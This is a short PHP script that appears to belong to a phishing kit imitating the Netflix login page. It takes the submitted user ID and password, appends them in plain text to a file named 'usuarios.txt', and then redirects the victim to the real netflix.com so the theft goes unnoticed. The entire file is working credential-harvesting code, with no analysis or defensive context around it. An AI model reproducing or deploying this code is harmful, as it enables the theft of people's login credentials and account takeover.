<?php

file_put_contents("usuarios.txt", "User: " . $_POST['userLoginId'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com');
exit();
?>
